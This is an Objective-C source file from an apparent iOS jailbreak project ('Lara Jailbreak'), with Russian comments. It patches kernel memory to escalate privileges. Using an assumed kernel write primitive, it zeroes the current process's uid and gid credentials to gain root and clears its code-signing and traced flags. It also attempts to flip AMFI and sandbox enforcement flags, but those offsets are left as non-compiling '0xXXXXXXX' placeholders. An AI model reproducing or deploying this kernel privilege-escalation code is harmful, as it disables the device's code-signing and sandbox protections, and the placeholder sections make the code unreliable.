//
//  kernel_patcher.m
//  Lara Jailbreak
//
//  Безопасный патчинг ядра через Shadow Pages
//  Отключение AMFI, Sandbox, получение Root
//

#import "kernel_patcher.h"
#import "shadow_pages.h"
#import "offset_finder.h"
#import "darksword.h"

#pragma mark - Helper Functions

// Получение указателя на структуру proc текущего процесса
static uint64_t get_current_proc(void) {
    kernel_offsets_t offs = get_kernel_offsets();
    uint64_t current_task_addr = get_kernel_base() + offs.current_task;
    
    uint64_t current_task = 0;
    if (!kread64(current_task_addr, &current_task)) return 0;
    current_task = strip_pac(current_task);
    
    // task->bsd_info -> proc
    uint64_t proc_addr = current_task + offs.task_bsd_info;
    uint64_t proc = 0;
    if (!kread64(proc_addr, &proc)) return 0;
    
    return strip_pac(proc);
}

#pragma mark - Root Patching

bool patch_root(void) {
    NSLog(@"[Patcher] Patching for root...");
    
    kernel_offsets_t offs = get_kernel_offsets();
    uint64_t our_proc = get_current_proc();
    
    if (!our_proc) {
        NSLog(@"[Patcher] ERROR: Cannot find current proc");
        return false;
    }
    
    NSLog(@"[Patcher] Current proc: 0x%llx", our_proc);
    
    // Чтение текущих uid/gid
    uint32_t cur_uid = 0;
    uint64_t ucred_addr = our_proc + offs.proc_p_ucred;
    uint64_t ucred = 0;
    if (!kread64(ucred_addr, &ucred)) {
        NSLog(@"[Patcher] ERROR: Cannot read ucred");
        return false;
    }
    ucred = strip_pac(ucred);
    
    uint64_t uid_addr = ucred + offs.ucred_cr_uid;
    kread32(uid_addr, &cur_uid);
    NSLog(@"[Patcher] Current UID: %d", cur_uid);
    
    if (cur_uid == 0) {
        NSLog(@"[Patcher] Already root!");
        return true;
    }
    
    // Запись UID=0, GID=0 через Shadow Pages (безопасно)
    uint32_t zero = 0;
    
    // cr_uid
    if (!shadow_write(uid_addr, &zero, sizeof(zero))) {
        NSLog(@"[Patcher] ERROR: Failed to patch UID");
        return false;
    }
    
    // cr_gid (следующие 4 байта)
    if (!shadow_write(uid_addr + 4, &zero, sizeof(zero))) {
        NSLog(@"[Patcher] ERROR: Failed to patch GID");
        return false;
    }
    
    // cr_ruid, cr_rgid
    if (!shadow_write(uid_addr + 8, &zero, sizeof(zero))) {
        NSLog(@"[Patcher] ERROR: Failed to patch RUID");
        return false;
    }
    if (!shadow_write(uid_addr + 12, &zero, sizeof(zero))) {
        NSLog(@"[Patcher] ERROR: Failed to patch RGID");
        return false;
    }
    
    NSLog(@"[Patcher] Root privileges granted! (UID=0, GID=0)");
    
    // Дополнительно: снимаем флаг CS_HARD, чтобы можно было выполнять неподписанный код
    uint64_t csflags_addr = our_proc + offs.proc_p_csflags;
    uint32_t csflags = 0;
    shadow_write(csflags_addr, &csflags, sizeof(csflags));
    
    // Снимаем флаг traced
    uint64_t traced_addr = our_proc + offs.proc_p_traced;
    shadow_write(traced_addr, &zero, sizeof(zero));
    
    return true;
}

#pragma mark - AMFI Patching

bool patch_amfi(void) {
    NSLog(@"[Patcher] Patching AMFI...");
    
    // Патч переменной amfi_allow_all (или аналогичной)
    // Находим адрес через offset finder или сканирование
    kernel_offsets_t offs = get_kernel_offsets();
    uint64_t base = get_kernel_base();
    
    // Для iOS 17.3.1 переменная может называться по-другому
    // Используем известный оффсет или найденный динамически
    uint64_t amfi_flag_addr = base + 0xXXXXXXX; // TODO: Найти реальный оффсет
    
    if (amfi_flag_addr == base) {
        NSLog(@"[Patcher] WARNING: AMFI flag address not resolved, skipping");
        return true; // Не критично, если root уже получен
    }
    
    uint8_t val = 1; // Включаем all-allow
    if (!shadow_write(amfi_flag_addr, &val, sizeof(val))) {
        NSLog(@"[Patcher] ERROR: Failed to patch AMFI");
        return false;
    }
    
    NSLog(@"[Patcher] AMFI patched");
    return true;
}

#pragma mark - Sandbox Patching

bool patch_sandbox(void) {
    NSLog(@"[Patcher] Patching Sandbox...");
    
    // Песочница контролируется через MACF (Mandatory Access Control Framework)
    // Патчим глобальный флаг sandbox_enabled или hook функции
    
    kernel_offsets_t offs = get_kernel_offsets();
    uint64_t base = get_kernel_base();
    
    // Адрес флага sandbox_enabled (примерный)
    uint64_t sb_flag_addr = base + 0xXXXXXXX; // TODO: Найти реальный оффсет
    
    if (sb_flag_addr == base) {
        NSLog(@"[Patcher] WARNING: Sandbox flag address not resolved");
        // Альтернативный метод: патч структуры proc нашего процесса
        uint64_t our_proc = get_current_proc();
        if (our_proc) {
            // sb_plabel или аналогичное поле
            // Пока пропускаем, т.к. требует точных оффсетов
            NSLog(@"[Patcher] Sandbox patch deferred (need offsets)");
        }
        return true;
    }
    
    uint8_t val = 0; // Выключаем песочницу
    if (!shadow_write(sb_flag_addr, &val, sizeof(val))) {
        NSLog(@"[Patcher] ERROR: Failed to patch Sandbox");
        return false;
    }
    
    NSLog(@"[Patcher] Sandbox patched");
    return true;
}

#pragma mark - Main Entry

bool apply_kernel_patches(void) {
    NSLog(@"[Patcher] Applying all kernel patches...");
    
    // Проверка инициализации
    if (!ds_is_ready()) {
        NSLog(@"[Patcher] ERROR: Darksword not ready");
        return false;
    }
    
    // Проверка инициализации Shadow Pages
    if (!shadow_pages_init()) {
        NSLog(@"[Patcher] ERROR: Shadow pages init failed");
        return false;
    }
    
    // Поиск оффсетов
    if (!find_kernel_offsets(get_kernel_base())) {
        NSLog(@"[Patcher] ERROR: Offset finding failed");
        return false;
    }
    
    // Порядок патчей важен:
    // 1. Root (чтобы иметь права)
    if (!patch_root()) {
        NSLog(@"[Patcher] CRITICAL: Root patch failed!");
        return false;
    }
    
    // 2. AMFI (чтобы разрешить неподписанный код)
    patch_amfi(); // Не критично, если не найдено
    
    // 3. Sandbox (чтобы лазить где угодно)
    patch_sandbox(); // Не критично, если не найдено
    
    NSLog(@"[Patcher] All patches applied successfully!");
    return true;
}
